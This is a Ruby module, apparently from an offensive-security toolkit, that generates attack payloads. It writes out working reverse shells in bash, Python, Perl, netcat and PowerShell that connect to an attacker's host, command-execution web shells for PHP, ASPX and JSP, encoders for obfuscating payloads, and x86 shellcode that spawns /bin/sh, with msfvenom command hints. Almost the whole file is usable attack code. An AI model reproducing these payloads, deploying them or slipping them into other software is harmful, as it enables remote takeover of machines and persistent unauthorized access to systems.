#!/usr/bin/env ruby
# aura-os/ruby-tools/lib/payload_generator.rb

require 'base64'
require 'uri'
require 'cgi'

module AuraTools
  class PayloadGenerator
    class ReverseShell
      def self.bash(lhost, lport)
        "bash -i >& /dev/tcp/#{lhost}/#{lport} 0>&1"
      end

      def self.python(lhost, lport)
        <<~PYTHON
          import socket,subprocess,os;
          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
          s.connect(("#{lhost}",#{lport}));
          os.dup2(s.fileno(),0);
          os.dup2(s.fileno(),1);
          os.dup2(s.fileno(),2);
          subprocess.call(["/bin/sh","-i"])
        PYTHON
      end

      def self.perl(lhost, lport)
        <<~PERL
          perl -e 'use Socket;
          $i="#{lhost}";
          $p=#{lport};
          socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
          if(connect(S,sockaddr_in($p,inet_aton($i)))){
            open(STDIN,">&S");
            open(STDOUT,">&S");
            open(STDERR,">&S");
            exec("/bin/sh -i");
          };'
        PERL
      end

      def self.nc(lhost, lport)
        "nc #{lhost} #{lport} -e /bin/sh"
      end

      def self.powershell(lhost, lport)
        <<~PS
          $client = New-Object System.Net.Sockets.TcpClient("#{lhost}",#{lport});
          $stream = $client.GetStream();
          [byte[]]$bytes = 0..65535|%{0};
          while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
            $sendback = (iex $data 2>&1 | Out-String );
            $sendback2  = $sendback + "PS " + (pwd).Path + "> ";
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
            $stream.Write($sendbyte,0,$sendbyte.Length);
            $stream.Flush()
          };
          $client.Close()
        PS
      end
    end

    class WebShell
      def self.php
        <<~PHP
          <?php
          if(isset($_REQUEST['cmd'])){
            system($_REQUEST['cmd']);
          }
          ?>
        PHP
      end

      def self.aspx
        <<~ASPX
          <%@ Page Language="C#" %>
          <%
          if (Request["cmd"] != null)
            System.Diagnostics.Process.Start("cmd.exe", "/c " + Request["cmd"]);
          %>
        ASPX
      end

      def self.jsp
        <<~JSP
          <%@ page import="java.io.*" %>
          <%
          String cmd = request.getParameter("cmd");
          if (cmd != null) {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
              out.println(line + "<br>");
            }
          }
          %>
        JSP
      end
    end

    class Encoder
      def self.base64_encode(payload)
        Base64.strict_encode64(payload)
      end

      def self.base64_decode(encoded)
        Base64.strict_decode64(encoded)
      end

      def self.hex_encode(payload)
        payload.unpack('H*')[0]
      end

      def self.hex_decode(encoded)
        [encoded].pack('H*')
      end

      def self.url_encode(payload)
        URI.encode_www_form_component(payload)
      end

      def self.rot13(payload)
        payload.tr('a-zA-Z', 'n-za-mN-ZA-M')
      end

      def self.double_url_encode(payload)
        encoded = URI.encode_www_form_component(payload)
        URI.encode_www_form_component(encoded)
      end
    end

    class Shellcode
      def self.exec_shell
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69" +
        "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
      end

      def self.reverse_tcp(ip, port)
        puts "[!] Use: msfvenom -p linux/x86/shell_reverse_tcp LHOST=#{ip} LPORT=#{port} -f raw"
      end

      def self.bind_shell(port)
        puts "[!] Use: msfvenom -p linux/x86/shell_bind_tcp LPORT=#{port} -f raw"
      end
    end
  end
end
